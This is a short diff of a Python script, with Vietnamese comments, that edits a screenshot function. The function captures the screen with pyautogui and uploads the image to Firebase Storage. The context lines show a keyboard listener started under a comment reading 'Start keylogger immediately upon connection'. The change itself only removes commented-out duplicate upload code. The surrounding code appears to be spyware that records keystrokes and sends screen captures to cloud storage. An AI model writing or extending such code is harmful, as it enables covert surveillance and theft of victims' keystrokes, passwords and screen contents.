@@ -38,6 +38,7 @@ def takeScreenshot():
     try:
         screenshot = pyautogui.screenshot()
         screenshot.save(nameScreen)
+        
         # Lưu ảnh vào Firebase Storage
         bucket = storage.bucket()
         blob = bucket.blob(nameScreen)
@@ -48,14 +49,6 @@ def takeScreenshot():
     except Exception as e:
         print("Error: " + str(e))
 
-    # Lưu ảnh vào Firebase Storage
-    # bucket = storage.bucket() hihiihi
-    # blob = bucket.blob(nameScreen)
-    # blob.upload_from_filename(nameScreen)
-    
-    # Gửi link ảnh đến server
-    # link = blob.public_url
-    # return link
     
 # Start keylogger immediately upon connection
 with Listener(on_press=on_press) as parent:
